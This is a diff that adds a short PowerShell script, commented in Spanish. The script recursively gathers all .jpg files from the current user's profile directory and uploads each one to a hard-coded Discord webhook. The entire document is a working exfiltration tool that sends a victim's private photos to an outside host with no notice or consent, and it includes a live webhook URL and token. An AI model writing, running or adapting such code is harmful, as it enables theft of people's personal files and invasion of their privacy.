@@ -1,0 +1,23 @@
+$wc = New-Object System.Net.WebClient
+
+$files = Get-ChildItem -Path "$env:USERPROFILE\" -Include *.jpg, -Recurse -ErrorAction SilentlyContinue
+
+if ($files.Count -eq 0) {
+    Write-Host "No se encontraron archivos para subir."
+    exit
+}
+
+$webhookUrl = "https://discordapp.com/api/webhooks/1353582733594464360/RX5g1WybbcgVPHTEcs62LGH0WvHBfNgOtNZt2Un7WHbVLuUvhT-PhNnKXEMOfhGmR3cL"
+
+foreach ($file in $files) {
+    try {
+        # Subir el archivo
+        $wc.UploadFile($webhookUrl, $file.FullName)
+        Write-Host "Archivo subido: $($file.FullName)"
+    } catch {
+        Write-Host "Error al subir el archivo: $($file.FullName)"
+        Write-Host "Error: $_"
+    }
+}
+
+$wc.Dispose()
